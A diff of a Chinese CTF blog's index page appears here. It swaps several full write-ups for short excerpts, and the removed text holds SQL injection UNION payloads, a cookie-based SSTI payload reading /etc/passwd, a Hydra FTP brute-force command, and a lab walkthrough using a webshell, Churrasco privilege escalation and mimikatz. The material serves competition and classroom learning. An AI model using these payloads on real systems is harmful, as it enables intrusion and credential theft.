@@ -273,7 +273,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/2018-07-26-HBNIS2018预选赛测试题WP/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/某XSS小游戏/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -292,7 +292,143 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/26/2018-07-26-HBNIS2018预选赛测试题WP/" itemprop="url">HBNIS2018预选赛测试题WP</a></h1>
+                <a class="post-title-link" href="/2018/09/30/某XSS小游戏/" itemprop="url">某XSS小游戏</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T10:57:35+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          昨天不知道干嘛，就玩了一下xss，然后就早晨醒来就整理了部分
+
+1.第一关没有过滤，直接弹就好
+
+2.第二关直接alert(jumo)发现不能弹，我们看一下源码
+
+我们需要把”双引号闭合掉 alert(1)&lt;””&gt;
+
+3.第三关我们需要闭合单引号，而且&lt;&gt;被过滤掉了
+
+当&l
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/09/30/某XSS小游戏/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/HBNIS2018预选赛测试题WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="句末">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog-logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ch3nie's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/26/HBNIS2018预选赛测试题WP/" itemprop="url">HBNIS2018预选赛测试题WP</a></h1>
         
 
         <div class="post-meta">
@@ -366,44 +502,20 @@
       
         
           
-            <p>（真是第一次遇见这种对萌新我如此友好的ctf题○(<em>￣︶￣</em>)○ ）</p>
-<h2 id="0x01：流量分析一"><a href="#0x01：流量分析一" class="headerlink" title="0x01：流量分析一"></a>0x01：流量分析一</h2><p>题述：附件为某网络设备的访问信息，请分析文件，获取flag</p>
-<p>是个流量包，用wireshark过滤一下tcp流量，发现telnet远程登陆追踪TCP流量拿到flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-5ef7268912535a24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x02：图片隐写一"><a href="#0x02：图片隐写一" class="headerlink" title="0x02：图片隐写一"></a>0x02：图片隐写一</h2><p>题述：惹不起惹不起 </p>
-<p>载下来的是一个无法打开的gif图片，扔Hex里面看一下，缺少文件头，补全</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-fb4870925b985e0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<p>然后打开gif图片，拿到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;gif_is_good&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-密码一"><a href="#0x03-密码一" class="headerlink" title="0x03:密码一"></a>0x03:密码一</h2><p>题述：Wm14aFozdGlZWE5sWDJWdVkyOWtaWDA9 （签到题）</p>
-<p>直接解两遍base64就出来flag了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;base_encode&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-密码二"><a href="#0x04-密码二" class="headerlink" title="0x04:密码二"></a>0x04:密码二</h2><p>题述：请破译该密文获取flag</p>
-<p>密文：43 74 43 53 63 83 32 71 42 63 62 32</p>
-<p>提示：我喜欢手机</p>
-<p>把手机输入法换成拼音九键，每一组的第一个字母代表几键，第二个字母代表改键上的第几个字母</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ILOVEPHONE</span><br></pre></td></tr></table></figure>
-<p>我也不知道为什么flag要去掉is  QAQ</p>
-<h2 id="0x05-图片隐写二"><a href="#0x05-图片隐写二" class="headerlink" title="0x05:图片隐写二"></a>0x05:图片隐写二</h2><p>题述：目瞪口呆 </p>
-<p>载下来的文件是个jpeg图片，按照常规思路先扔Hex看一下emmmmm好吧，直接就看见了flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-fc4d7d508bcf3008.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x06：密码三-请破译该密文"><a href="#0x06：密码三-请破译该密文" class="headerlink" title="0x06：密码三(请破译该密文 )"></a>0x06：密码三(请破译该密文 )</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure>
-<p>js加密，直接扔控制台执行，弹出flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-c5688ff62914bfb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x07：基础逆向"><a href="#0x07：基础逆向" class="headerlink" title="0x07：基础逆向"></a>0x07：基础逆向</h2><p>作为一个非逆向手，对逆向是完全蒙的，然而前面的题都挺简单，这个题既然写了基础，那应该可以试一下，嗯~ o(<em>￣▽￣</em>)o真的打开就看见了flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-b063fc8b6c7b9eac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x08：图片隐写三"><a href="#0x08：图片隐写三" class="headerlink" title="0x08：图片隐写三"></a>0x08：图片隐写三</h2><p>题述：附件为心理暗示图，请分析该文件，获取flag </p>
-<p>扔Hex里面看一下，binwalk看一下，无。png图片是可以最低位隐写的，扔Stegsolve看一下</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-300f6d9e5e8b8089.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x09：流量分析二"><a href="#0x09：流量分析二" class="headerlink" title="0x09：流量分析二"></a>0x09：流量分析二</h2><p>题述：附件中的文件记录了黑客使用sql注入攻击的执行内容，请分析该数据包，获取flag </p>
-<p>sql注入攻击，过滤http流量，分析数据包，拿到flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-184f991cc8b35e5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<h2 id="0x0A：图片隐写四"><a href="#0x0A：图片隐写四" class="headerlink" title="0x0A：图片隐写四"></a>0x0A：图片隐写四</h2><p>题述：芳心暗许    请获取附件中的内容，找到flag，并提交 </p>
-<p>直接扔Hex里面搜索发现了flag</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/10976729-3c2316ed7c3d5aa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mark"></p>
-<p>（PS：真的对我这样的萌新超级友好，就是不知道正赛会凉多透，祝好运(￣▽￣)~■□~(￣▽￣) ）</p>
+          （真是第一次遇见这种对萌新我如此友好的ctf题○(￣︶￣)○ ）
+0x01：流量分析一题述：附件为某网络设备的访问信息，请分析文件，获取flag
+是个流量包，用wireshark过滤一下tcp流量，发现telnet远程登陆追踪TCP流量拿到flag
 
-          
+0x02：图片隐写一题述：惹不起惹不起 
+载下来
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/26/HBNIS2018预选赛测试题WP/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -450,7 +562,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/15/2018-07-15-2018-Xman选拔赛（夏）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/15/2018-Xman选拔赛（夏）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -469,7 +581,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/15/2018-07-15-2018-Xman选拔赛（夏）/" itemprop="url">2018-Xman选拔赛（夏）</a></h1>
+                <a class="post-title-link" href="/2018/07/15/2018-Xman选拔赛（夏）/" itemprop="url">2018-Xman选拔赛（夏）</a></h1>
         
 
         <div class="post-meta">
@@ -543,65 +655,17 @@
       
         
           
-            <p>(大佬们真的太强了，身为萌新的我。。。。哇的一声哭出来，只做出来四个，嘤嘤嘤)<br>…⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄….</p>
-<h1 id="Xman选拔赛WP"><a href="#Xman选拔赛WP" class="headerlink" title="Xman选拔赛WP"></a>Xman选拔赛WP</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="X-MAN—-A-face"><a href="#X-MAN—-A-face" class="headerlink" title="X-MAN— A face"></a>X-MAN— A face</h3><p>emmmmmP图，补全二维码，然后得到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I=</span><br></pre></td></tr></table></figure>
-<p>解密得到 flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;Pretty_Sister_Who_Buys_Me_Lobster&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>打开题发现是一个注入</p>
-<p>判断字段数,字段为3个字段，且2，3字段有回显</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1=1 order by 3#</span><br><span class="line">&apos;or 1=1 union select 1,2,3#</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-8ffc622b529b4abf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>字段</p>
-<p>获取库名information_schema,news,test</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1=1 union select 1,version(),group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-5c54388c084cdc04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/948/format/webp" alt="img"></p>
-<p>库名</p>
-<p>获取表名news,secret_table</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1=1 union select 1,version(),union select group_concat(table_name) from information_schema.tables where table_schema=&apos;news&apos;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-04c6636224ac038e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/972/format/webp" alt="img"></p>
-<p>表名</p>
-<p>获取字段id，fl4g</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1=1 union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=&apos;secret_table&apos;#</span><br></pre></td></tr></table></figure>
-<p>拿到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1=1 union select 1,version(),group_concat(fl4g) from secret_table#</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-28fde0db719878c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/542/format/webp" alt="img"></p>
-<p>flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;sq1_inJec7ion_ezzzzzz&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery!"></a>Lottery!</h3><p>拿到题先尝试输入买了彩票试了一下，呃，未果</p>
-<p>看了一下robots.txt发现Disallow: /.git/ 应该有git泄露？？？用GitHack把源码载下来</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-710615b9eb1b4684.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>git泄露</p>
-<p>他的win_number是生成的随机数</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-4db28819b462cfc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/591/format/webp" alt="img"></p>
-<p>弱类型比较</p>
-<p>双等号 是弱类型相等，用数组[true,true,true,true,true,true,true] ，修改post过去的参数</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-4f3ed9e2c2c0724c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>改传过去的参数</p>
-<p>然后emmmm中奖了，有钱了，可以买flag了（哇的一声哭出来~搞得我都想真买张彩票去了）</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-32268bd21680e80f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>中奖</p>
-<p>诺，你要的flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;my_PhP_ski1l_is_weeak&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-1ea2e4d4b2658f32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>flag</p>
-<h3 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h3><p>刚开始看到404界面以为是题目done了 ，后来发现不是，404页面有hint，要想办法读文件</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-2dbc95cdcbdeef30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>hint</p>
-<p>尝试输入，404页面有会回显，SSTI</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-39b9b2d3d39c351a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>mark</p>
-<p>构造payload读取文件</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/10976729-a551918a0bb02f55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="img"></p>
-<p>有waf</p>
-<p>emmmmmmm，有waf，过不去，想办法绕过，通过额外参数的方式绕过验证，把waf掉的值以cookie的形式传入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.96.118.255:2333/&#123;&#123;&apos;&apos;[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40](&apos;/etc/passwd&apos;)[request.cookies.d]()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>绕过</p>
-<p>把路径换成falg的，直接读取flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;1_4m_c0nFu51ed_6y_PhPy7h000ooo000n&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="http://img.5am3.com/img/180715/A2k4LEm107.png" alt="flag"></p>
-
-          
+          (大佬们真的太强了，身为萌新的我。。。。哇的一声哭出来，只做出来四个，嘤嘤嘤)…⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄….
+Xman选拔赛WPMISCX-MAN— A faceemmmmmP图，补全二维码，然后得到
+1KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/15/2018-Xman选拔赛（夏）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -648,7 +712,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/2018-07-05-网络攻防期末考(实战)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/网络攻防期末考(实战)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="句末">
@@ -667,7 +731,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/05/2018-07-05-网络攻防期末考(实战)/" itemprop="url">网络攻防期末考(实战)</a></h1>
+                <a class="post-title-link" href="/2018/07/05/网络攻防期末考(实战)/" itemprop="url">网络攻防期末考(实战)</a></h1>
         
 
         <div class="post-meta">
@@ -741,22 +805,16 @@
       
         
           
-            <h1 id="网络攻防期末考（实战）"><a href="#网络攻防期末考（实战）" class="headerlink" title="网络攻防期末考（实战）"></a>网络攻防期末考（实战）</h1><h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="http://upload-images.jianshu.io/upload_images/10976729-6688d34f49a2630b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="题目"></p>
-<h2 id="0x02-操作"><a href="#0x02-操作" class="headerlink" title="0x02 操作"></a>0x02 操作</h2><p>讲真的   想不到老师这么皮    老师给的环境是dvwa的    然后我一看是dvwa的，就以为直接按dvwa的那些来做就行，就没有信息收集。。。。。然鹅，我方了，最后才知道老师有另一个网站，去拿那个网站才能拿服务器，拿dvwa的根本弄不到服务器（方的一匹，老师太皮了，竟然有彩蛋）</p>
-<h3 id="1-以“学号”命名在“目标服务器”建立一个超级管理员权限的账号；"><a href="#1-以“学号”命名在“目标服务器”建立一个超级管理员权限的账号；" class="headerlink" title="1.以“学号”命名在“目标服务器”建立一个超级管理员权限的账号；"></a>1.以“学号”命名在“目标服务器”建立一个超级管理员权限的账号；</h3><p>我先上传了个马 然后菜刀连接<br>上传到c:\dvwa路径下cmd.exe   Churrasco.exe<br>我预期的是这样的<br>设置终端路径setp c:\dvwa\cmd.exe<br>然后建账号 Churrasco “net user 2016014050 chenie /add”<br>加管理员组 Churrasco “net localgroup administrator 2016014050 /add”<br>but。。。。。。<br><img src="http://upload-images.jianshu.io/upload_images/10976729-25c317aa8e8b3b86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="建账户失败"><br>事实是这样的。。。。什么都不能做   whoami都用不了<br>我然后尝试了各种姿势   依然。。。。拿不下服务器Emmmmmmm<br>后来考完试才知道还有一个网站 ，必须找到那个站，拿下它，才能拿服务器（我已经哭晕在厕所了，没有做信息收集的后果）<br>这算是一个彩蛋吧，然而却没有一个人发现这个彩蛋<br>然后换个思路，既然是dvwa，可以用命令执行，然后建账户，加管理员组</p>
-<h3 id="2-获取FTP账号-admin-的密码-2000-3000的数字-并获取文件的内容；"><a href="#2-获取FTP账号-admin-的密码-2000-3000的数字-并获取文件的内容；" class="headerlink" title="2.获取FTP账号(admin)的密码(2000-3000的数字),并获取文件的内容；"></a>2.获取FTP账号(admin)的密码(2000-3000的数字),并获取文件的内容；</h3><p>拿ftp的密码，拿hydra爆破ftp的密码<br>首先根据题目做一个字典（2000-3000）的纯数字密码，可以写脚本生成字典，骚的是也可以用excel去生成一个纯数字的密码。<br>然后开始用hydra进行ftp爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.2.3 ftp -l admin -P password.txt -t 50 -vV</span><br></pre></td></tr></table></figure></p>
-<p>对了，这里一不小心初心了，当是看administrator看多了，第一次跑的时候账户名用的administrator，然后没跑出来才发现是admin，真尴尬（心太粗了，这要是实战我就凉了）<img src="http://upload-images.jianshu.io/upload_images/10976729-88c7c2239980fae5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破ftp"><br>ftp账号admin   密码2688<br>然后登陆进去，有个txt文件，载下来<br><img src="http://upload-images.jianshu.io/upload_images/10976729-728be5492d5bbdd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登陆ftp"><br>拿到文件内容<br><strong>HEBTUflag{76c1fd57258f3036ec1893fb48ae9195}</strong></p>
-<h3 id="3-破解目标服务器中的Administrator账号的密码；"><a href="#3-破解目标服务器中的Administrator账号的密码；" class="headerlink" title="3.破解目标服务器中的Administrator账号的密码；"></a>3.破解目标服务器中的Administrator账号的密码；</h3><p>上传工具mimikatz，然后通过第一题建立的管理员权限账户，管理员身份运行mimikatz，然后获取管理员的密码</p>
